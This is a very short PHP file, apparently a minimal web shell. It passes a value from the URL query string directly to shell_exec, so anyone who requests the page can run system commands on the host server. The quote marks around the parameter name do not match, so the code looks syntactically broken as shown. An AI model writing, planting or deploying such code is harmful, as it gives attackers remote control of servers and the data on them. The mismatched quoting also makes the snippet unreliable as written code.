<?php
shell_exec($_GET["5292XnHN']);
?>
